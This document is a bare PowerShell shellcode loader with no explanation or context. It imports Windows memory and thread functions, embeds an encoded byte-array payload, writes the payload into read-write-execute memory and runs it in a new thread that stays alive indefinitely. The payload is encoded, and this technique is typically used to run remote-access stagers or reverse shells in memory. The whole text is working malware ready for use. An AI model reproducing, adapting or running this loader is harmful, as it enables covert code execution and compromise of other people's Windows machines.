$omg = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $omg -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x94,0x77,0xd1,0xb6,0xd9,0xcc,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x43,0x13,0x83,0xc3,0x04,0x03,0x43,0x9b,0x95,0x24,0x4a,0x4b,0xdb,0xc7,0xb3,0x8b,0xbc,0x4e,0x56,0xba,0xfc,0x35,0x12,0xec,0xcc,0x3e,0x76,0x00,0xa6,0x13,0x63,0x93,0xca,0xbb,0x84,0x14,0x60,0x9a,0xab,0xa5,0xd9,0xde,0xaa,0x25,0x20,0x33,0x0d,0x14,0xeb,0x46,0x4c,0x51,0x16,0xaa,0x1c,0x0a,0x5c,0x19,0xb1,0x3f,0x28,0xa2,0x3a,0x73,0xbc,0xa2,0xdf,0xc3,0xbf,0x83,0x71,0x58,0xe6,0x03,0x73,0x8d,0x92,0x0d,0x6b,0xd2,0x9f,0xc4,0x00,0x20,0x6b,0xd7,0xc0,0x79,0x94,0x74,0x2d,0xb6,0x67,0x84,0x69,0x70,0x98,0xf3,0x83,0x83,0x25,0x04,0x50,0xfe,0xf1,0x81,0x43,0x58,0x71,0x31,0xa8,0x59,0x56,0xa4,0x3b,0x55,0x13,0xa2,0x64,0x79,0xa2,0x67,0x1f,0x85,0x2f,0x86,0xf0,0x0c,0x6b,0xad,0xd4,0x55,0x2f,0xcc,0x4d,0x33,0x9e,0xf1,0x8e,0x9c,0x7f,0x54,0xc4,0x30,0x6b,0xe5,0x87,0x5c,0x58,0xc4,0x37,0x9c,0xf6,0x5f,0x4b,0xae,0x59,0xf4,0xc3,0x82,0x12,0xd2,0x14,0xe5,0x08,0xa2,0x8b,0x18,0xb3,0xd3,0x82,0xde,0xe7,0x83,0xbc,0xf7,0x87,0x4f,0x3d,0xf8,0x5d,0xe5,0x38,0x6e,0x10,0x4f,0x40,0x77,0xc4,0xad,0x45,0x96,0x48,0x3b,0xa3,0xc8,0x20,0x6b,0x7c,0xa8,0x90,0xcb,0x2c,0x40,0xfb,0xc3,0x13,0x70,0x04,0x0e,0x3c,0x1a,0xeb,0xe7,0x14,0xb2,0x92,0xad,0xef,0x23,0x5a,0x78,0x8a,0x63,0xd0,0x8f,0x6a,0x2d,0x11,0xe5,0x78,0xd9,0xd1,0xb0,0x23,0x4f,0xed,0x6e,0x49,0x6f,0x7b,0x95,0xd8,0x38,0x13,0x97,0x3d,0x0e,0xbc,0x68,0x68,0x05,0x75,0xfd,0xd3,0x71,0x7a,0x11,0xd4,0x81,0x2c,0x7b,0xd4,0xe9,0x88,0xdf,0x87,0x0c,0xd7,0xf5,0xbb,0x9d,0x42,0xf6,0xed,0x72,0xc4,0x9e,0x13,0xad,0x22,0x01,0xeb,0x98,0xb2,0x7d,0x3a,0xe4,0xc0,0x6f,0xfe;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$6qe9=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($6qe9.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$6qe9,0,0,0);for (;;){Start-sleep 60};
